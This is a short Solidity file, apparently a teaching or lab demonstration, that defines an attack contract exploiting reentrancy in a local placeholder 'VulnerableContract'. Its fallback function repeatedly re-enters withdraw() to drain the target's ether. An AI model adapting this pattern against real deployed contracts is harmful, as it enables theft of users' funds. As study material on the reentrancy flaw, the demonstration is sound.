// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "./VulnerableContract.sol";

contract AttackContract {
    VulnerableContract vulnerableContract;

    constructor(address _vulnerableContractAddress) {
        vulnerableContract = VulnerableContract(_vulnerableContractAddress);
    }

    function attack() public payable {
        vulnerableContract.deposit{value: msg.value}();
        vulnerableContract.withdraw();
    }

    receive() external payable {
        if(address(vulnerableContract).balance > 0) {
            vulnerableContract.withdraw();
        }
    }
}
